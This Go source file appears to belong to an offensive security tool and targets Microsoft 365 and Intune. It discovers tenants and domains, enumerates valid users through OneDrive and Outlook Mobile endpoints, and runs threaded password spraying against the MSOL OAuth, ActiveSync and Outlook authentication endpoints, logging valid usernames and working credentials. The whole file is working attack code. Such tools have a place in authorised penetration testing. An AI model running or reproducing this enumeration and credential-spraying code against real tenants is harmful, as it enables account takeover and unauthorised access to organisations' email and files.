package intune

import (
	"encoding/base64"
	"fmt"
	"github.com/mr-pmillz/dauthi/utils"
	"regexp"
	"strings"
	"time"
)

// MDMA ...
type MDMA struct {
	Opts     utils.ChargeOpts
	Logr     *utils.Logger
	Tenant   []string
	Domain   []string
	TokenURL string
	Cycle
}

// Cycle ...
type Cycle struct {
	Buff   *chan bool
	Block  *chan bool
	Length int
	API    *utils.API
}

const (
	Usage = `
  Intune Options:
    -a                     User-Agent for request [default: Agent/20.08.0.23/Android/11]

    -Tenant                o365 Tenant
  `

	// Methods are available tool methods
	Methods = `
  Intune Methods:
    Disco                  intune endpoint discovery query
    Disco-Tenant           o365 Tenant/Domain query
    Prof-outlook           Outlook Mobile service profiling
    enum-onedrive          o365 onedrive email enumeration of target o365 Tenant
    enum-onedrive-full     o365 onedrive email enumeration of all o365 Tenant/domains
    enum-outlook           Outlook Mobile user enumeration
    Auth-async             SFA against 0365 Active-Sync endpoint
    Auth-msol              SFA against o365 OAuth endpoint
    Auth-outlook           SFA against o365 Outlook Basic Auth
	`

	discoveryAPI     = `https://enterpriseenrollment.%s`
	onedriveAPI      = `https://%s-my.sharepoint.com/personal/%s/_layouts/15/onedrive.aspx`
	tenantAPI        = `https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc`
	openIDAPI        = `https://login.windows.net/%s/.well-known/openid-configuration`
	outlookAuthAPI   = `https://outlook.office365.com/shadow/v2.0/authentication`
	asyncAPI         = `https://outlook.office365.com/Microsoft-Server-ActiveSync`
	outlookMobileAPI = `https://prod-autodetect.outlookmobile.com/detect?services=office365,outlook,google,yahoo,icloud,yahoo.co.jp&protocols=all&timeout=20`

	tenantPOST = `<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:exm="http://schemas.microsoft.com/exchange/services/2006/` +
		`messages" xmlns:ext="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:a="http://www.w3.org/2005/08/addressing" ` +
		`xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/` +
		`2001/XMLSchema"><soap:Header><a:Action soap:mustUnderstand="1">http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/` +
		`GetFederationInformation</a:Action><a:To soap:mustUnderstand="1">https://autodiscover-s.outlook.com/autodiscover/autodiscover.svc` +
		`</a:To><a:ReplyTo><a:Address>http://www.w3.org/2005/08/addressing/anonymous</a:Address></a:ReplyTo></soap:Header><soap:Body>` +
		`<GetFederationInformationRequestMessage xmlns="http://schemas.microsoft.com/exchange/2010/Autodiscover"><Request><Domain>%s</Domain>` +
		`</Request></GetFederationInformationRequestMessage></soap:Body></soap:Envelope>`

	msolPOST = `resource=https://graph.windows.net&client_id=a7aff123-97b3-498e-b2d4-c9d6f9fcc34a&client_info=1&grant_type=password` +
		`&scope=openid&username=%s&password=%s`

	outlookAuthAPIPost = `{"client_id": "OutlookMobile", "grant_type": "remote_shadow_authorization", "remote_auth_provider": "OnPremiseExchange", ` +
		`"remote_auth_protocol": "BasicAuth", "remote_server": {"hostname": "outlook.office365.com", "disable_certificate_validation": true}, ` +
		`"remote_auth_credential": {"userId": "%s", "secret": "%s", "email_address": "%s"}, ` +
		`"display_name": "%s"}`
	GET              = `GET`
	ProfOutlook      = "Prof-outlook"
	POST             = `POST`
	enumOneDriveFull = "enum-onedrive-full"
	authMSOL         = "Auth-msol"
	enumOneDrive     = "enum-onedrive"
	authAsync        = "Auth-async"
	enumOutlook      = "enum-outlook"
	authOutlook      = "Auth-outlook"
)

func b64encode(v []byte) string {
	return base64.StdEncoding.EncodeToString(v)
}

// Init MDMA with default values and return obj
func Init(o utils.ChargeOpts) *MDMA {
	if o.Agent == "" {
		o.Agent = "Agent/20.08.0.23/Android/11"
	}
	if o.RUUID {
		o.UUID = utils.RandUUID(21)
	}
	log := utils.NewLogger("intune")

	return &MDMA{
		Opts:   o,
		Tenant: []string{},
		Domain: []string{},
		Logr:   log,
		Cycle: Cycle{
			API: &utils.API{
				Debug: o.Debug,
				Log:   log,
				Proxy: o.Proxy},
		},
	}
}

// Clone copies an *MDMA for process threading
func (m *MDMA) Clone() *MDMA {
	clone := Init(m.Opts) // assign target
	clone.Domain = m.Domain
	clone.Tenant = m.Tenant
	clone.Cycle.Block = m.Cycle.Block
	clone.Cycle.Buff = m.Cycle.Buff

	return clone
}

// Parser wrapper to parse JSON/XML objects
func (m *MDMA) Parser(data interface{}, p string) bool {
	switch p {
	case "json":
		err := m.Cycle.API.Resp.ParseJSON(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}

	case "xml":
		err := m.Cycle.API.Resp.ParseXML(data)
		if err != nil {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Response Marshall Error: %v", err)
			return true
		}
	}

	return false
}

// PullDomains ...
func (m *MDMA) PullDomains(silent bool) {
	var domains struct {
		Domain []string `xml:"Body>GetFederationInformationResponseMessage>Response>Domains>Domain"`
	}

	m.Cycle.API.Name = `autodiscover`
	m.Cycle.API.URL = tenantAPI
	m.Cycle.API.Data = fmt.Sprintf(tenantPOST, m.Opts.Endpoint)
	m.Cycle.API.Method = POST
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"Content-Type":    []string{"text/xml; charset=utf-8"},
			"SOAPAction":      []string{"http://schemas.microsoft.com/exchange/2010/Autodiscover/Autodiscover/GetFederationInformation"},
			"User-Agent":      []string{"AutodiscoverClient"},
			"Accept-Encoding": []string{"identity"}}}
	m.Cycle.API.Proxy = "" // Proxy request hangs for API call?

	m.Cycle.API.WebCall()
	if m.Cycle.API.Resp.Status != 200 {
		m.Logr.Failf([]interface{}{m.Opts.Method}, "Tenant Request Failed")
		return
	}

	if m.Parser(&domains, "xml") {
		return
	}

	domcount, tencount := 0, 0
	for _, dom := range domains.Domain {
		if strings.Contains(dom, "onmicrosoft.com") {
			tencount++
			dom := strings.ReplaceAll(dom, ".onmicrosoft.com", "")
			m.Tenant = append(m.Tenant, dom)
		} else {
			domcount++
			m.Domain = append(m.Domain, dom)
		}
	}

	if !silent {
		if tencount > 0 {
			m.Logr.Infof([]interface{}{tencount}, "o365 Tenant(2) Identified")
			for _, v := range m.Tenant {
				m.Logr.Successf([]interface{}{v}, "Tenant Domain")
			}
		}

		if domcount > 0 {
			m.Logr.Infof([]interface{}{domcount}, "o365 Domain(s) Identified")
			for _, v := range m.Domain {
				m.Logr.Successf([]interface{}{v}, "Alias Domain")
			}
		}
	}
}

// GetToken ...
func (m *MDMA) GetToken() {
	var token struct {
		TokenURL string `json:"token_endpoint"`
	}

	m.Cycle.API.Name = `openid-query`
	m.Cycle.API.URL = fmt.Sprintf(openIDAPI, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent}}}

	m.Cycle.API.WebCall()

	// Validate response status
	if m.Cycle.API.Resp.Status != 200 {
		if m.Opts.Debug > 0 {
			m.Logr.Debugf([]interface{}{m.Opts.Endpoint}, "Invalid Server Response Code: %v", m.Cycle.API.Resp.Status)
		}
		m.Logr.Errorf([]interface{}{"openid-query"}, "Failed to identify Tenant ID")
		return
	}

	if m.Parser(&token, "json") {
		return
	}

	m.TokenURL = token.TokenURL
}

// Disco ...
func (m *MDMA) Disco() {
	m.Cycle.API.Name = `discoveryAPI`
	m.Cycle.API.URL = fmt.Sprintf(discoveryAPI, m.Opts.Endpoint)
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = nil

	m.Cycle.API.WebCall()

	// Validate response status
	if m.Cycle.API.Resp.Status != 302 {
		if m.Opts.Debug > 0 {
			m.Logr.Debugf([]interface{}{m.Opts.Endpoint}, "Invalid Server Response Code: %v", m.Cycle.API.Resp.Status)
		}
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
		return
	}
	m.Validate()
}

// Prof ...
func (m *MDMA) Prof() {
	m.Cycle.API.Name = m.Opts.Method
	m.Cycle.API.URL = outlookMobileAPI
	m.Cycle.API.Data = ""
	m.Cycle.API.Method = GET
	m.Cycle.API.Opts = &map[string]interface{}{
		"Header": map[string][]string{
			"User-Agent": []string{m.Opts.Agent},
			"X-Email":    []string{m.Opts.UserName}}}

	m.Cycle.API.WebCall()

	// Validate response status
	if m.Cycle.API.Resp.Status != 200 {
		m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Profiling Failed")
		return
	}
	m.Validate()
}

// Auth ...
//
//nolint:gocognit
func (m *MDMA) Auth() {
	var file []byte
	var err error

	if m.Opts.File != "" {
		file, err = utils.ReadFile(m.Opts.File)
		if err != nil {
			m.Logr.Fatalf([]interface{}{m.Opts.File}, "File Read Failure")
		}
	}

	lines := strings.Split(string(file), "\n")
	block := make(chan bool, m.Opts.Threads)
	buff := make(chan bool, len(lines))
	m.Cycle.Block = &block
	m.Cycle.Buff = &buff
	m.Cycle.Length = len(lines)

	if m.Opts.Method != enumOneDriveFull {
		m.Logr.Infof([]interface{}{m.Opts.Method}, "threading %d values across %d threads", m.Cycle.Length, m.Opts.Threads)
	}

	if m.Opts.Method == authMSOL {
		m.GetToken()
		if m.TokenURL == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Unable to identify Token Endpoint")
			return
		}
	}

	for _, line := range lines {
		if len(lines) > 1 && line == "" {
			*m.Cycle.Buff <- false
			continue
		}

		target := m.Clone()

		if line == "" {
			_ = target.Opts.UserName
		} else {
			target.Opts.UserName = line
		}

		switch m.Opts.Method {
		case enumOneDrive:
			udscore := regexp.MustCompile(`(?:@|\.)`)

			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = fmt.Sprintf(onedriveAPI, target.Opts.Tenant, udscore.ReplaceAllString(target.Opts.UserName+"@"+target.Opts.Endpoint, `_`))
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = GET
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent": []string{target.Opts.Agent}}}

		case enumOneDriveFull:
			if target.Opts.Tenant == "" ||
				len(target.Domain) == 0 {
				target.PullDomains(true)

				if len(target.Tenant) == 0 {
					m.Logr.Errorf([]interface{}{target.Opts.Method}, "Failed to pull Tenant details")
					return
				}

				m.Logr.Infof([]interface{}{target.Opts.Method}, "threading %d values across %d threads", len(lines)*(len(target.Tenant)*len(target.Domain)), target.Opts.Threads)
				for _, ten := range target.Tenant {
					if !utils.Resolver(ten + "-my.sharepoint.com") {
						m.Logr.Infof([]interface{}{target.Opts.Method, ten}, "Tenant non-Resolvable: tasklist decreased of %v", len(lines)*len(target.Domain))
						continue // Skip Unresolvable
					}

					for _, dom := range target.Domain {
						target.Opts.Tenant = ten
						target.Opts.Endpoint = dom
						target.Auth()
					}
				}
				return
			} else {
				udscore := regexp.MustCompile(`(?:@|\.)`)

				target.Cycle.API.Name = target.Opts.Method
				target.Cycle.API.URL = fmt.Sprintf(onedriveAPI, target.Opts.Tenant, udscore.ReplaceAllString(target.Opts.UserName+"@"+target.Opts.Endpoint, `_`))
				target.Cycle.API.Data = ""
				target.Cycle.API.Method = GET
				target.Cycle.API.Opts = &map[string]interface{}{
					"Header": map[string][]string{
						"User-Agent": []string{target.Opts.Agent}}}

				target.Thread()
				continue
			}

		case enumOutlook:
			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = outlookMobileAPI
			target.Cycle.API.Data = ""
			target.Cycle.API.Method = GET
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent": []string{target.Opts.Agent},
					"X-Email":    []string{target.Opts.UserName}}}

		case authMSOL:
			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = m.TokenURL
			target.Cycle.API.Data = fmt.Sprintf(msolPOST, target.Opts.UserName, target.Opts.Password)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"Accept-Encoding": []string{"gzip, deflate"},
					"Accept":          []string{"application/json"},
					"Content-Type":    []string{"application/x-www-form-urlencoded"},
					"User-Agent":      []string{"Windows-AzureAD-Authentication-Provider/1.0 3236.84364"}}}

		case authOutlook:
			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = outlookAuthAPI
			target.Cycle.API.Data = fmt.Sprintf(outlookAuthAPIPost, target.Opts.UserName, target.Opts.Password, target.Opts.Email, target.Opts.Email)
			target.Cycle.API.Method = POST
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"X-DeviceType": []string{"Android"},
					"Accept":       []string{"application/json"},
					"User-Agent":   []string{"Outlook-Android/2.0"},
					"X-DeviceId":   []string{utils.RandGUID()},
					"X-Shadow":     []string{"2a6af961-7d3c-416b-bcfe-72ac4531e659"},
					"Content-Type": []string{"application/json"}}}

		case authAsync:
			target.Cycle.API.Name = target.Opts.Method
			target.Cycle.API.URL = asyncAPI
			target.Cycle.API.Data = ``
			target.Cycle.API.Method = `OPTIONS`
			target.Cycle.API.Opts = &map[string]interface{}{
				"Header": map[string][]string{
					"User-Agent":    []string{target.Opts.Agent},
					"Authorization": []string{b64encode([]byte(target.Opts.UserName + ":" + target.Opts.Password))},
					"Content-Type":  []string{"application/x-www-form-urlencoded"}}}

		default:
			m.Logr.Failf([]interface{}{m.Opts.Method}, "Unknown Method Called")
		}
		target.Thread()
	}

	for i := 0; i < m.Cycle.Length; i++ {
		<-*m.Cycle.Buff
	}
	close(*m.Cycle.Block)
	close(*m.Cycle.Buff)
}

// Thread represents the threading process to loop multiple requests
func (m *MDMA) Thread() {
	*m.Cycle.Block <- true
	go func() {
		m.Cycle.API.WebCall()

		if m.Cycle.API.Resp.Status == 0 {
			if m.Opts.Miss < m.Opts.Retry {
				m.Opts.Miss++
				m.Logr.Infof([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Retrying Request")
				<-*m.Cycle.Block
				m.Thread()
				return
			}
			m.Logr.Failf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName, m.Opts.Password}, "Null Server Response")
		}
		m.Validate()

		// Sleep interval through Thread loop
		time.Sleep(time.Duration(m.Opts.Sleep) * time.Second)
		<-*m.Cycle.Block
		*m.Cycle.Buff <- true
	}()
}

// Validate ...
//
//nolint:gocognit
func (m *MDMA) Validate() {
	switch m.Opts.Method {
	case "Disco":
		if m.Cycle.API == nil {
			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Discovery Failed")
		} else if m.Cycle.API.Resp.Header["Location"][0] == "https://intune.microsoft.com/" {
			m.Logr.Successf([]interface{}{"intune.microsoft.com"}, "Endpoint Discovered")
		}

	case enumOneDrive, enumOneDriveFull:
		if m.Cycle.API.Resp.Status == 302 {
			if len(m.Cycle.API.Resp.Header["Location"]) > 0 {
				if strings.Contains(m.Cycle.API.Resp.Header["Location"][0], "my.sharepoint.com") {
					m.Logr.Successf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName}, "Valid User")
				} else {
					break
				}
			} else {
				break
			}
		}
		m.Logr.Failf([]interface{}{m.Opts.Tenant, m.Opts.Endpoint, m.Opts.UserName}, "Invalid User")

	case enumOutlook, ProfOutlook:
		var check struct {
			Email    string `json:"email"`
			Services []struct {
				Hostname string `json:"hostname"`
				Protocol string `json:"protocol"`
				Service  string `json:"service"`
				AAD      string `json:"aad"`
			} `json:"services"`
			Protocols []struct {
				Protocol string `json:"protocol"`
				Hostname string `json:"hostname"`
				AAD      string `json:"aad"`
			} `json:"protocols"`
		}

		if m.Cycle.API.Resp.Status != 200 {
			m.Logr.Failf([]interface{}{m.Opts.Endpoint}, "Nonexistent Domain")
			return
		} else if m.Parser(&check, "json") {
			return
		}

		if m.Opts.Method == ProfOutlook {
			if len(check.Services) > 0 {
				for _, i := range check.Services {
					m.Logr.Successf([]interface{}{i.Service, i.Protocol, i.Hostname}, "Supported Service: %s", i.AAD)
				}
			}
			if len(check.Protocols) > 0 {
				for _, i := range check.Protocols {
					m.Logr.Successf([]interface{}{i.Protocol, i.Hostname}, "Supported Protocol: %s", i.AAD)
				}
			}
			return
		}

		if len(check.Services) > 0 {
			m.Logr.Successf([]interface{}{m.Opts.UserName}, "Valid User")
			return
		}
		m.Logr.Failf([]interface{}{m.Opts.UserName}, "Invalid User")

	case authMSOL:
		switch {
		case m.Cycle.API.Resp.Status == 200:
			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Successful Authentication")
		case m.Cycle.API.Resp.Status == 400:
			var check struct {
				Error string `json:"error_description"`
			}
			if m.Parser(&check, "json") {
				return
			}
			re := regexp.MustCompile(`^(.+?): (.+?)\n`)
			data := re.FindStringSubmatch(check.Error)
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password, data[1]}, "%s", data[2])
		default:
			m.Logr.Failf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Unknown Response")
		}

	case authOutlook:
		m.Logr.Infof([]interface{}{m.Opts.Method}, "Under development")
		m.Logr.Infof([]interface{}{m.Opts.Method}, "Status: %v - Headers: %v - Body: %s", m.Cycle.API.Resp.Status, m.Cycle.API.Resp.Header, m.Cycle.API.Resp.Body)

	case authAsync:
		if m.Cycle.API.Resp.Status == 200 {
			m.Logr.Successf([]interface{}{m.Opts.UserName, m.Opts.Password}, "Successful Authentication")
			return
		}
		m.Logr.Failf([]interface{}{m.Opts.Email, m.Opts.Password}, "Failed Authentication")
	}
}

// Call represents the switch function for activating all class methods
func (m *MDMA) Call() {
	switch m.Opts.Method {
	case "Disco":
		m.Disco()

	case "Disco-Tenant":
		m.PullDomains(false)

	case ProfOutlook:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Prof()

	case enumOneDrive:
		if m.Opts.UserName == "" &&
			m.Opts.File == "" ||
			m.Opts.Tenant == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Tenant/User/File required")
			return
		}
		m.Auth()

	case enumOneDriveFull:
		if m.Opts.UserName == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "User/File required")
			return
		}
		m.Auth()

	case enumOutlook:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Auth()

	case authMSOL:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Auth()

	case authOutlook:
		if (m.Opts.UserName == "" || m.Opts.Email == "") && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "User/Email or Email/User-File required")
			return
		}
		m.Auth()

	case authAsync:
		if m.Opts.Email == "" && m.Opts.File == "" {
			m.Logr.Errorf([]interface{}{m.Opts.Method}, "Email/File required")
			return
		}
		m.Opts.UserName = m.Opts.Email
		m.Auth()

	default:
		m.Logr.StdOut(Methods)
		m.Logr.Fatalf(nil, "Invalid Method Selected %v", m.Opts.Method)
	}
}
